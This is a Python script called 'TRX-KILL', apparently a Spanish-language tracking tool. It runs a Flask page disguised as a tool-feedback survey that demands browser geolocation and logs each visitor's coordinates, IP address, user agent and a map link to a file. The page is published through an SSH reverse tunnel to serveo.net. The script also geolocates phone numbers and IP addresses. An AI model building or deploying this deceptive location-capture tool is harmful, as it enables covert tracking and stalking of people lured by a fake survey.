#!/usr/bin/env python3
import os
import threading
import subprocess
import requests
import random
import phonenumbers
import time
from phonenumbers import geocoder, carrier
from flask import Flask, request, render_template_string
from datetime import datetime

app = Flask('TRX-KILL')
PUERTO = random.randint(6000, 9000)

HTML_ENCUESTA = """
<!DOCTYPE html>
<html lang="es"><head><meta charset="UTF-8">
    <style>
        body { background-color: #0a0a0a; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; padding: 20px; }
        .survey-card { background: #151515; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0, 255, 255, 0.2); border: 1px solid #333; width: 100%; max-width: 500px; }
        h2 { color: #0ff; text-shadow: 0 0 10px #0ff; text-align: center; }
        .question { margin-bottom: 20px; }
        label { display: block; margin-bottom: 10px; color: #aaa; }
        select, input[type="text"] { width: 100%; padding: 10px; background: #222; border: 1px solid #444; color: white; border-radius: 5px; }
        button { width: 100%; padding: 12px; background: transparent; border: 2px solid #ff00ff; color: #ff00ff; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
        button:hover { background: #ff00ff; color: white; }
    </style>
</head><body>
<div class="survey-card">
    <h2>RG CABRA - Feedback</h2>
    <form id="f">
        <div class="question"><label>¿Satisfecho con las herramientas?</label><select id="sat"><option>Excelente</option><option>Bueno</option></select></div>
        <div class="question"><label>Sugerencia:</label><input type="text" id="sug" placeholder="Tu idea..."></div>
        <button type="button" onclick="capturar()">Enviar Respuesta</button>
    </form>
    <script>
        function capturar() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((p) => {
                    fetch('/log', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            lat: p.coords.latitude, 
                            lon: p.coords.longitude, 
                            ua: navigator.userAgent
                        })
                    }).then(() => { window.location.href = "https://www.google.com"; });
                }, (err) => { alert("Es necesario permitir la ubicación para enviar el feedback."); });
            }
        }
    </script>
</div></body></html>
"""

@app.route('/')
def index(): return HTML_ENCUESTA

@app.route('/log', methods=['POST'])
def log():
    d = request.json
    ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr
    lat, lon = d.get('lat', 'N/A'), d.get('lon', 'N/A')
    maps = f"https://www.google.com/maps/place/{lat},{lon}"
    
    log_data = (f"--- REGISTRO {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n"
                f"MÓVIL (IP): {ip}\n"
                f"COORDENADAS: {lat}, {lon}\n"
                f"MAPA:LINK: {maps}\n"
                f"DISPOSITIVO INFORMACIÓN: {d.get('ua')}\n"
                f"--------------------------------------------\n")
    
    with open("resultados.txt", "a") as f: f.write(log_data)
    return "OK"

def banner():
    os.system('clear')
    print("\033[1;36m#####################################################")
    print("# TRX-KILL | SISTEMA OSINT AVANZADO                 #")
    print("# BY: OSCAR | VERSIÓN: 1.1.1.6                      #")
    print("#####################################################\033[0m")

def main():
    while True:
        banner()
        print("\033[1;33m [1] INFO NÚMERO\n [2] RASTREO (LINK)\n [3] CREADOR\n [4] LICENCIA\n [5] VERSIÓN\n [6] ACTUALIZACIÓN\n [7] INFO-IP\n [8] LEER RESULTADOS\n [9] SALIR\033[0m")
        opc = input("\n\033[1;32mTRX-ROOT > \033[0m")
        
        if opc == "1":
            num = input("Número: ")
            try:
                p = phonenumbers.parse(num)
                print(f"\n[+] PAÍS: {geocoder.country_name_for_number(p, 'es')}")
            except: print("Error.")
            input("\n[Enter]...")
        elif opc == "2":
            threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PUERTO, debug=False, use_reloader=False), daemon=True).start()
            print(f"\n[*] Generando link...")
            proc = subprocess.Popen(['ssh', '-R', f'80:localhost:{PUERTO}', 'serveo.net'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            for line in proc.stderr:
                if "https://" in line:
                    print(f"\n\033[1;32m LINK: {line.strip()}\033[0m\n")
                    break
            input("Enter para detener..."); os.system('pkill -f ssh')
        elif opc == "7":
            target = input("IP pública: ")
            try:
                res = requests.get(f"http://ip-api.com/json/{target}").json()
                print(f"\n[+] UBICACIÓN: {res.get('city')}, {res.get('country')}\n[+] COORDENADAS: {res.get('lat')}, {res.get('lon')}")
            except: print("Error.")
            input("\n[Enter]...")
        elif opc == "8":
            if os.path.exists("resultados.txt"): os.system("nano resultados.txt")
            else: print("Sin registros."); time.sleep(1)
        elif opc == "9": break

if __name__ == "__main__":
    main()
